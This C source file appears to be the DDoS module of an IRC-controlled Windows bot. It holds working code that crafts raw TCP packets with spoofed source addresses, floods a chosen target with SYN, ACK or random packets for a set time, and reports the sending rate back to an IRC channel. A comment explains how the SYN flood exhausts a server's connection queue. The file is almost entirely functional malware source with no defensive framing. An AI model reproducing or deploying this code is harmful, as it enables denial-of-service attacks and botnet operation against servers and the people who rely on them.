#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_DDOS

DWORD WINAPI DDOSThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	DDOS ddos = *((DDOS *)param);
	DDOS *ddoss = (DDOS *)param;
	ddoss->gotinfo = TRUE;

	srand(GetTickCount());

	sprintf(sendbuf, "[DDoS]: Done with flood (%iKB/sec).", DDOSAttack(ddos.ip, ddos.port, ddos.type, ddos.length));
	if (!ddos.silent) irc_privmsg(ddos.sock, ddos.chan, sendbuf, ddos.notice); 
	addlog(sendbuf);

	clearthread(ddos.threadnum);

	ExitThread(0); 
}

long SendDDOS(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort, int len)
{ 
	WSADATA WSAData; 
	SOCKET sock; 
	SOCKADDR_IN addr_in; 
	IPHEADER ipHeader; 
	TCPHEADER tcpHeader; 
	PSDHEADER psdHeader; 
 
	LARGE_INTEGER freq, halt_time, cur;
	char szSendBuf[60]={0},buf[64]; 
	int rect;

	if (fWSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
		return FALSE; 
 
	if ((sock = fWSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED )) == INVALID_SOCKET) {
		fWSACleanup();
		return FALSE;
	}

	BOOL flag=TRUE;
	if (fsetsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
		fclosesocket(sock);
		fWSACleanup();
		return FALSE; 
	}

	addr_in.sin_family=AF_INET;
	addr_in.sin_port=fhtons((unsigned short)TargetPort);
	addr_in.sin_addr.s_addr=TargetIP;

	ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=fhtons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP;
	ipHeader.checksum=0;
	ipHeader.destIP=TargetIP;

	tcpHeader.dport=fhtons((unsigned short)TargetPort);
	tcpHeader.sport=fhtons((unsigned short)rand()%1025);
	tcpHeader.seq=fhtonl(0x12345678);

	/* A SYN attack simply smash its target up with TCP SYN packets. 
	Each SYN packet needs a SYN-ACK response and forces the server to wait for 
	the good ACK in reply. Of course, we just never gives the ACK, since we use a 
	bad IP address (spoof) there's no chance of an ACK returning. 
	This quickly kills a server as it tries to send out SYN-ACKs while waiting for ACKs. 
	When the SYN-ACK queues fill up, the server can no longer take any incoming SYNs, 
	and that's the end of that server until the attack is cleared up.*/

	if (strcmp(Type,"ddos.syn") == 0) {
		tcpHeader.ack_seq=0;
		tcpHeader.flags=SYN;
	} else if (strcmp(Type,"ddos.ack") == 0) {
		tcpHeader.ack_seq=0;
		tcpHeader.flags=ACK;
	} else if (strcmp(Type,"ddos.random") == 0) {
		tcpHeader.ack_seq=rand()%3;
		if (rand()%2 == 0) 
			tcpHeader.flags=SYN;
		else 
			tcpHeader.flags=ACK;
	}
	
	tcpHeader.lenres=(sizeof(tcpHeader)/4<<4|0); 
	tcpHeader.window=fhtons(16384); 
	tcpHeader.urg_ptr=0; 

	long total = 0;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&cur);
	halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;
 
	while (1) {
		tcpHeader.checksum=0; 
		tcpHeader.sport=fhtons((unsigned short)((rand() % 1001) + 1000));
		tcpHeader.seq=fhtons((unsigned short)((rand() << 16) | rand()));

		ipHeader.sourceIP=fhtonl(SpoofingIP++); 

		psdHeader.daddr=ipHeader.destIP; 
		psdHeader.zero=0; 
		psdHeader.proto=IPPROTO_TCP; 
		psdHeader.length=fhtons(sizeof(tcpHeader));
		psdHeader.saddr=ipHeader.sourceIP; 
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
		
		tcpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		rect=fsendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&addr_in, sizeof(addr_in));
		if (rect==SOCKET_ERROR) {
			sprintf(buf, "[DDoS]: Send error: <%d>.",fWSAGetLastError());
			addlog(buf);

			fclosesocket(sock);
			fWSACleanup();
			return 0;
		}
     
		total += rect;
		QueryPerformanceCounter(&cur);
		if (cur.QuadPart >= halt_time.QuadPart)
			break;
	}

	fclosesocket(sock); 
	fWSACleanup(); 
 
	return (total);
}

long DDOSAttack(char *target, char *port, char *type, char *len)
{
	unsigned long TargetIP = ResolveAddress(target);
	unsigned short p = atoi(port);
	int t = atoi(len);
	unsigned int SpoofIP = TargetIP + ((rand()%512)+256);

	long num = SendDDOS(TargetIP, SpoofIP, type, p, t);

	if (num == 0) 
		num = 1;  
	num = num / 1000 / t;

	return num;
}
#endif
